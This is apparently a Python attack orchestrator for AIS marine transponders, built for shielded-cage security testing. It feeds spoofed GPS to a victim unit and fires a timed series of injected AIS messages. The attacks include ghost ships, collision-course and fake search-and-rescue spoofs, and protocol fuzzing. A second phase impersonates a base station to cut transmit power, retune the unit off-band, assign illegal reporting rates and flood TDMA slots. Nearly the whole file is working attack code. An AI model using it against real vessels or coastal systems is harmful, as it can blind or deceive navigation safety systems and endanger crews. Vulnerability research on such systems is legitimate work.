#!/usr/bin/env python3
r"""
rf_session.py -- run a full attack SESSION against a transponder: feed it GPS
continuously (so it has a fix and transmits), fire a timeline of AIS attacks over the
ais-simulator websocket, and log everything to one timestamped manifest so the separate
VHF and serial recordings can be aligned afterward.

Why this exists: some attacks only make sense when the SDR injection is aligned with the
transponder's own position (collision course must aim at where the victim actually is).
This orchestrator holds the victim's simulated GPS position and lets position-aware
attacks read it, so everything is synced. Fire-and-forget attacks (commands, fuzzing)
run on the same timeline for one clean, richly-populated capture.

** SAFETY ** transmits AIS -> cage sealed only. Requires the cage-sealed confirmation.

Setup (all cage sealed):
  listener Pi:     ./record_ais.sh                       # VHF witness
  transponder Pi:  python3 record_serial.py --port ... --baud 38400   # serial witness
  attacker Pi:     python3 -u ais-simulator.py --channel B -l 20      # tx backend
  attacker Pi:     python3 rf_session.py --gps-port /dev/ttyUSB0 \
                       --victim-mmsi 677777777 --lat 42.35 --lon -70.90

The GPS feed and the attack timeline both run from THIS script. The victim transponder
gets GPS on --gps-port; attacks go out the websocket to ais-simulator.

Requires: pyserial, pynmea2, websocket-client.
"""
import argparse, json, math, os, sys, threading, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ais_encode as enc
try:
    import websocket
except Exception:
    websocket = None
try:
    import serial, pynmea2
    from datetime import datetime, timezone
except Exception:
    serial = None


# ----------------------------------------------------------------------------
# GPS feed (background thread) -- keeps the victim transponder at a live position
# ----------------------------------------------------------------------------
class GpsFeed(threading.Thread):
    """Continuously send GGA+RMC+VTG for the current position to the transponder.
    The position is mutable so the timeline can move the victim if desired."""
    def __init__(self, port, baud, lat, lon, alt=10.0, speed=0.0, course=0.0, rate=1.0):
        super().__init__(daemon=True)
        self.port, self.baud, self.rate = port, baud, rate
        self.lat, self.lon, self.alt = lat, lon, alt
        self.speed, self.course = speed, course
        self._stop = threading.Event()
        self.ser = None

    def _sentences(self):
        now = datetime.now(timezone.utc)
        t = now.strftime("%H%M%S.00"); d = now.strftime("%d%m%y")
        def nm(deg, is_lat):
            hemi = ('N' if deg >= 0 else 'S') if is_lat else ('E' if deg >= 0 else 'W')
            deg = abs(deg); dd = int(deg); m = (deg-dd)*60
            return (f"{dd:02d}{m:07.4f}" if is_lat else f"{dd:03d}{m:07.4f}"), hemi
        la, lah = nm(self.lat, True); lo, loh = nm(self.lon, False)
        gga = pynmea2.GGA('GP','GGA',(t,la,lah,lo,loh,'1','08','0.9',
                                      f"{self.alt:.1f}",'M','0.0','M','',''))
        rmc = pynmea2.RMC('GP','RMC',(t,'A',la,lah,lo,loh,f"{self.speed:.1f}",
                                      f"{self.course:.1f}",d,'','','A'))
        vtg = pynmea2.VTG('GP','VTG',(f"{self.course:.1f}",'T','','M',
                                      f"{self.speed:.1f}",'N',f"{self.speed*1.852:.1f}",'K','A'))
        # ZDA: dedicated UTC date/time sentence. AIS transponders use it to acquire
        # UTC sync for TDMA timing. Without it, units may report "UTC sync invalid".
        zda = pynmea2.ZDA('GP','ZDA',(t, now.strftime('%d'), now.strftime('%m'),
                                      now.strftime('%Y'), '00','00'))
        return (zda, gga, rmc, vtg)

    def run(self):
        self.ser = serial.Serial(self.port, self.baud, timeout=1)
        next_tick = time.monotonic()
        while not self._stop.is_set():
            for s in self._sentences():
                try:
                    self.ser.write((str(s) + "\r\n").encode())
                except Exception:
                    pass
            # schedule the next batch on a precise cadence so the UTC timestamps
            # advance in step with real elapsed time (helps the unit hold UTC sync).
            next_tick += self.rate
            sleep_for = next_tick - time.monotonic()
            if sleep_for > 0:
                time.sleep(sleep_for)
            else:
                next_tick = time.monotonic()  # fell behind; resync
        self.ser.close()

    def set_position(self, lat, lon, speed=None, course=None):
        self.lat, self.lon = lat, lon
        if speed is not None: self.speed = speed
        if course is not None: self.course = course

    def stop(self):
        self._stop.set()


# ----------------------------------------------------------------------------
# helpers to aim position-aware attacks at the victim
# ----------------------------------------------------------------------------
def offset_position(lat, lon, bearing_deg, dist_m):
    """Point dist_m from (lat,lon) along bearing (flat-earth, fine for cage-scale)."""
    b = math.radians(bearing_deg)
    dlat = (dist_m * math.cos(b)) / 111320.0
    dlon = (dist_m * math.sin(b)) / (111320.0 * math.cos(math.radians(lat)))
    return lat + dlat, lon + dlon


# ----------------------------------------------------------------------------
# The attack timeline. Each entry: (name, builder) where builder(ctx) -> list of
# (payload_bits, meta). ctx gives access to the live victim position + config.
# Position-aware builders read ctx.victim_lat/lon; others ignore it.
# ----------------------------------------------------------------------------
class Ctx:
    def __init__(self, victim_mmsi, gps):
        self.victim_mmsi = victim_mmsi
        self.gps = gps
    @property
    def victim_lat(self): return self.gps.lat
    @property
    def victim_lon(self): return self.gps.lon


def build_timeline(ctx):
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    tl = []

    # --- position spoofs (some aimed at the victim) ---
    tl.append(("ghost_ship",
        [(enc.encode_type1(366000001, vlat + 0.02, vlon + 0.02, sog=0.0),
          "ghost near victim")]))
    tl.append(("impossible_jump",
        [(enc.encode_type1(366000002, vlat, vlon), "jump A at victim"),
         (enc.encode_type1(366000002, vlat + 0.3, vlon + 0.3), "jump B far")]))
    tl.append(("impossible_speed",
        [(enc.encode_type1(366000003, vlat, vlon, sog=102.0, cog=90.0),
          "102kn at victim")]))
    tl.append(("collision_course",
        # a vessel 0.05 deg NORTH of the victim, heading SOUTH (180) toward it at 20kn
        [(enc.encode_type1(366000010, *offset_position(vlat, vlon, 0, 5000),
                           sog=20.0, cog=180.0), "attacker N of victim, heading S")]))
    tl.append(("fake_identity_sar",
        [(enc.encode_type1(111000001, vlat, vlon), "SAR-prefix at victim")]))
    tl.append(("rapid_ghost_fleet",
        [(enc.encode_type1(366100000 + i, vlat + 0.01*i, vlon + 0.01*(i % 3), sog=5.0),
          f"fleet {i}") for i in range(6)]))

    # --- command / control (addressed to the victim) ---
    tl.append(("interrogation",
        [(enc.encode_type15(366000001, V, msg1_1=5), f"M15 interrogate victim {V}")]))
    tl.append(("interrogation_type3",
        [(enc.encode_type15(366000001, V, msg1_1=3), f"M15 request type3 from {V}")]))
    tl.append(("auto_ack",
        [(enc.encode_type6(366000001, V, dac=1, fid=0, app_data_bits="0"*40),
          f"M6 addressed to victim {V}")]))
    tl.append(("rate_assignment",
        [(enc.encode_type16(366000001, V, offset_a=0, increment_a=0),
          f"M16 near-silence to {V}")]))
    tl.append(("channel_mgmt",
        [(enc.encode_type22(366000001, addressed=1, dest1=V, power=1),
          f"M22 channel/power to {V}")]))
    tl.append(("slot_reservation",
        [(enc.encode_type20(366000001, offset1=0, slots1=5, timeout1=7),
          "M20 reserve 5 slots")]))
    tl.append(("base_vs_regular",
        [(enc.encode_type15(2000000, V, msg1_1=5), "M15 from BASE"),
         (enc.encode_type15(366000001, V, msg1_1=5), "M15 from REGULAR")]))

    # --- broadcast binary ---
    tl.append(("fake_area_notice",
        [(enc.encode_type8(366000001, dac=1, fid=22, app_data_bits="0"*80), "M8 area notice")]))
    tl.append(("fake_met_hydro",
        [(enc.encode_type8(366000001, dac=1, fid=11, app_data_bits="0"*80), "M8 met/hydro")]))

    # --- protocol fuzzing / malformed ---
    tl.append(("reserved_values",
        [(enc.encode_type1_raw(366000001, vlat, vlon, sog_u=1023, nav_status=13,
                               cog_u=4000, heading=511), "nav13/sog1023/cog4000")]))
    tl.append(("sentinels_misused",
        [(enc.encode_type1_raw(366000001, 91.0, 181.0), "lat91/lon181")]))
    tl.append(("spare_bits_nonzero",
        [(enc.encode_type1_raw(366000001, vlat, vlon, spare=7), "spare=7")]))
    tl.append(("undefined_msg_type",
        [(enc.encode_undefined_type(28, 366000001), "type 28")]))
    tl.append(("truncated_msg",
        [(enc.make_truncated(enc.encode_type1(366000001, vlat, vlon), 80), "truncated 80b")]))
    tl.append(("oversized_msg",
        [(enc.make_oversized(enc.encode_type1(366000001, vlat, vlon), 40), "oversized +40b")]))

    return tl


# Phase 2: the aggressive / potentially-disruptive tests, severity-ordered.
# These run AFTER phase 1, each with a large gap, because they may reconfigure or
# disrupt the transponder. BASE_STATION source MMSI (00xxxxxxx) tests source authority.
BASE_MMSI = 2000000              # 00xxxxxxx = base station identity
AIS_CH_A, AIS_CH_B = 2087, 2088  # normal AIS channel numbers
NON_AIS_CH = 2001                # a marine VHF channel well outside the AIS band

def build_phase2(ctx):
    V = ctx.victim_mmsi
    vlat, vlon = ctx.victim_lat, ctx.victim_lon
    p2 = []

    # 1) power mode change, sent AS A BASE STATION (source-authority test)
    p2.append(("p2_power_as_base",
        [(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
                            power=1, addressed=1, dest1=V),
          "M22 from BASE: set DY to LOW power")]))

    # 2) switch AIS channels (tell DY to swap A/B) from a base station
    p2.append(("p2_channel_swap",
        [(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_B, channel_b=AIS_CH_A,
                            addressed=1, dest1=V),
          "M22 from BASE: swap DY channels A<->B")]))

    # 3) FREQUENCY SWEEP: try to move DY to several different channels, from a base
    #    station. After EACH attempt, send a recovery M22 putting DY back on the normal
    #    AIS channels, so that if one target works it does not silence all later tests.
    #    Targets span: adjacent marine channels, channels progressively further from the
    #    AIS band, and edge/invalid channel numbers. This finds WHICH (if any) DY accepts.
    #    NOTE: this returns MULTIPLE named entries so each is logged and gapped separately.
    #    They are appended here and handled as individual timeline items.
    sweep_targets = [
        (2088, "AIS2 162.025 (control: legal target)"),
        (2087, "AIS1 161.975 (control: legal target)"),
        (2086, "ch 86 ~161.925 (adjacent, just below AIS)"),
        (2001, "ch 1 ~156.05 (far below AIS band)"),
        (2028, "ch 28 ~162.00-ish region"),
        (2078, "ch 78 (near-band marine)"),
        (0,    "channel 0 (invalid/edge)"),
        (4095, "channel 4095 (max 12-bit, invalid)"),
    ]
    for chan, label in sweep_targets:
        p2.append((f"p2_retune_ch{chan}",
            [(enc.encode_type22(BASE_MMSI, channel_a=chan, channel_b=chan,
                                addressed=1, dest1=V),
              f"M22 from BASE: retune DY to channel {chan} [{label}]")]))
        # recovery: immediately command DY back to normal AIS channels
        p2.append((f"p2_recover_after_ch{chan}",
            [(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
                                addressed=1, dest1=V),
              "M22 from BASE: RECOVERY -> restore DY to AIS channels 2087/2088")]))

    # 4) illegal reporting rate vs speed: GPS is set FAST (handled in main by moving
    #    the victim), but we ASSIGN a slow report interval via M16 -> non-compliant.
    #    (ITU-R M.1371 requires faster reporting at higher speed; this violates it.)
    p2.append(("p2_illegal_rate_for_speed",
        [(enc.encode_type16(BASE_MMSI, V, offset_a=0, increment_a=1125),
          "M16 from BASE: assign SLOW rate while DY moves FAST (illegal combo)")]))

    # 5) timing / slot overload -- reserve large slot blocks (FATDMA hogging)
    p2.append(("p2_slot_overload",
        [(enc.encode_type20(BASE_MMSI, offset1=0, slots1=15, timeout1=7, increment1=0),
          "M20 from BASE: reserve 15 slots (max block)"),
         (enc.encode_type20(BASE_MMSI, offset1=200, slots1=15, timeout1=7),
          "M20 from BASE: reserve 15 more slots")]))

    # 6) TDMA disruption via injected M1 with manipulated comm-state claiming slots,
    #    high-rate, to induce collisions with DY's own transmissions.
    p2.append(("p2_tdma_collision_flood",
        [(enc.encode_type1(366000900 + i, vlat, vlon, sog=0.0), f"collision flood {i}")
         for i in range(8)]))

    return p2


def main():
    ap = argparse.ArgumentParser(description="Run a full GPS+attack session (synced).")
    ap.add_argument("--gps-port", required=True, help="serial port feeding the victim GPS")
    ap.add_argument("--gps-baud", type=int, default=4800)
    ap.add_argument("--victim-mmsi", type=int, required=True,
                    help="the transponder's MMSI (addressed commands target this)")
    ap.add_argument("--lat", type=float, required=True, help="victim start latitude")
    ap.add_argument("--lon", type=float, required=True, help="victim start longitude")
    ap.add_argument("--url", default="ws://127.0.0.1:52002/ws")
    ap.add_argument("--gap", type=float, default=15.0,
                    help="seconds between phase-1 attacks")
    ap.add_argument("--phase2-gap", type=float, default=30.0,
                    help="seconds between phase-2 (aggressive) attacks; kept large")
    ap.add_argument("--phase2", action="store_true",
                    help="also run the aggressive phase-2 tests (base-station power, "
                         "channel swap, off-band retune, illegal rate, slot/TDMA overload)")
    ap.add_argument("--phase2-only", action="store_true",
                    help="skip phase 1 and run ONLY the aggressive phase-2 tests")
    ap.add_argument("--fast-speed", type=float, default=25.0,
                    help="knots to set the victim during the illegal-rate test "
                         "(>23kn requires 2s reporting; assigning slow is then illegal)")
    ap.add_argument("--settle", type=float, default=60.0,
                    help="seconds to feed GPS before starting attacks (let it get a fix)")
    ap.add_argument("--repeat", type=int, default=3,
                    help="send each attack's messages this many times (persistence)")
    ap.add_argument("--only", nargs="+", help="run only these named attacks")
    ap.add_argument("--skip", nargs="+", default=[])
    ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
    ap.add_argument("--i-confirm-cage-sealed", action="store_true")
    args = ap.parse_args()

    if websocket is None or serial is None:
        print("!! needs websocket-client, pyserial, pynmea2:")
        print("   pip install websocket-client pyserial pynmea2 --break-system-packages")
        sys.exit(1)

    if not args.i_confirm_cage_sealed:
        if input("Type EXACTLY 'cage is sealed' to run the session: ").strip() != "cage is sealed":
            print("Aborted."); sys.exit(0)

    os.makedirs(args.logdir, exist_ok=True)
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    manifest = os.path.join(args.logdir, f"session_{stamp}.jsonl")
    mf = open(manifest, "a", buffering=1)
    def rec(**kw):
        mf.write(json.dumps({"t": time.time(),
                             "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                             **kw}) + "\n")

    # start GPS feed
    gps = GpsFeed(args.gps_port, args.gps_baud, args.lat, args.lon)
    gps.start()
    rec(event="session_start", victim_mmsi=args.victim_mmsi,
        start_lat=args.lat, start_lon=args.lon, gps_port=args.gps_port)
    print(f"GPS feeding victim @ {args.lat},{args.lon} on {args.gps_port}")
    print(f"settling {args.settle}s so the transponder gets a fix...")
    time.sleep(args.settle)

    ctx = Ctx(args.victim_mmsi, gps)
    timeline = build_timeline(ctx)
    if args.phase2_only:
        timeline = []
    if args.only:
        timeline = [(n, p) for (n, p) in timeline if n in args.only]
    timeline = [(n, p) for (n, p) in timeline if n not in args.skip]

    print(f"connecting to {args.url}")
    ws = websocket.create_connection(args.url, timeout=10)
    print(f"phase 1: {len(timeline)} attacks, {args.gap}s apart, repeat {args.repeat}x\n")

    def fire(name, payloads, idx, total, tag=""):
        rec(event="attack_begin", name=name, index=idx, phase=tag,
            victim_lat=ctx.victim_lat, victim_lon=ctx.victim_lon,
            victim_speed=gps.speed)
        print(f"[{tag}{idx+1}/{total}] {name} @ {time.strftime('%H:%M:%S')}")
        for r in range(args.repeat):
            for (bits, meta) in payloads:
                if any(c not in "01" for c in bits):
                    rec(event="skip_bad", name=name, meta=meta); continue
                ws.send(bits)
                rec(event="sent", name=name, rep=r, meta=meta, bits_len=len(bits))
                print(f"      -> {meta}")
                time.sleep(0.8)
        rec(event="attack_end", name=name)

    try:
        for i, (name, payloads) in enumerate(timeline):
            fire(name, payloads, i, len(timeline), tag="P1:")
            if i < len(timeline) - 1:
                time.sleep(args.gap)

        # ---- phase 2: aggressive tests, larger gaps, severity-ordered ----
        if args.phase2 or args.phase2_only:
            p2 = build_phase2(ctx)
            print(f"\n=== PHASE 2: {len(p2)} aggressive tests, {args.phase2_gap}s apart ===")
            print("    (base-station power, channel swap, off-band retune, illegal rate,")
            print("     slot/TDMA overload -- may disrupt the transponder)\n")
            rec(event="phase2_start", n=len(p2), gap=args.phase2_gap)
            for i, (name, payloads) in enumerate(p2):
                # for the illegal-rate test, drive the victim FAST first so the
                # assigned slow rate genuinely violates the speed/rate rule
                if name == "p2_illegal_rate_for_speed":
                    gps.set_position(ctx.victim_lat, ctx.victim_lon,
                                     speed=args.fast_speed, course=90.0)
                    rec(event="victim_speed_set", speed=args.fast_speed,
                        note="fast so assigned slow rate is illegal")
                    print(f"    (victim speed set to {args.fast_speed}kn for illegal-rate test)")
                    time.sleep(5)   # let a few fast reports go out before the M16
                fire(name, payloads, i, len(p2), tag="P2:")
                if name == "p2_illegal_rate_for_speed":
                    gps.set_position(ctx.victim_lat, ctx.victim_lon, speed=0.0)  # back to static
                if i < len(p2) - 1:
                    # recovery commands follow their retune attempt QUICKLY (short gap)
                    # so DY is not left off-channel for a full gap; other tests use the
                    # full phase2 gap so any disruption is observable.
                    if name.startswith("p2_retune_ch"):
                        print(f"    ...5s then recovery command...")
                        time.sleep(5)
                    else:
                        print(f"    ...{args.phase2_gap}s gap (watch for disruption)...")
                        time.sleep(args.phase2_gap)

            # final safety recovery: no matter what, end by restoring AIS channels + power
            print("    final recovery: restoring DY to AIS channels 2087/2088, high power")
            for _ in range(3):
                ws.send(enc.encode_type22(BASE_MMSI, channel_a=AIS_CH_A, channel_b=AIS_CH_B,
                                          power=0, addressed=1, dest1=args.victim_mmsi))
                rec(event="final_recovery", meta="restore AIS channels + high power")
                time.sleep(1)
    except KeyboardInterrupt:
        print("\ninterrupted.")
        rec(event="interrupted")
    finally:
        ws.close()
        gps.stop()
        rec(event="session_end")
        mf.close()

    print(f"\ndone. session manifest: {manifest}")
    print("Stop the listener and serial recorders, then send me:")
    print("  - listener NMEA (~/ais/ais_*.nmea)")
    print("  - transponder serial NMEA (ais_serial_*.nmea)")
    print(f"  - this manifest ({manifest})")


if __name__ == "__main__":
    main()
